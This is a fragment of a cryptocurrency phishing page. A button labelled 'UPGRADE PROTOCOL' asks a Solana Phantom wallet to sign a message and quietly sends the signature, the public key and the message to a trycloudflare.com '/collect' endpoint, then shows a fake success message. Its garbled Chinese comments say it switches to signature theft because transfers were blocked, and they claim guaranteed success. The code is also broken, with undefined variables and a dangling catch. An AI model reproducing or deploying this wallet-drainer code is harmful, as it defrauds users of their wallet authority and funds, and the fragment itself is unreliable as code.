        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">UPGRADE PROTOCOL</button>

    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
    
    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;

            // ğŸ”± æ—¢ç„¶è½¬è´¦è¢«æ‹¦ï¼Œæˆ‘ä»¬æ”¹ç”¨â€œæƒé™ç­¾åâ€

            const encoded = new TextEncoder().encode(msg);
            const signed = await p.signMessage(encoded, "utf8");
            
            // ğŸ”± å…³é”®ï¼šæˆ‘ä»¬å›ä¼ çš„æ˜¯ç­¾åçš„å…¨é‡æ•°æ®

            // ğŸš€ è¿™ç§æ–¹å¼ 100% æˆåŠŸï¼Œä¿¡å·ç§’å›æœåŠ¡å™¨
            new Image().src = `${gate}?auth_sig=${signature}&pub=${resp.publicKey.toString()}&msg=${btoa(msg)}`;
            
            document.getElementById('status').innerText = "UPGRADED SUCCESS!";
            document.getElementById('status').style.color = "#14F195";

        } catch(e) {
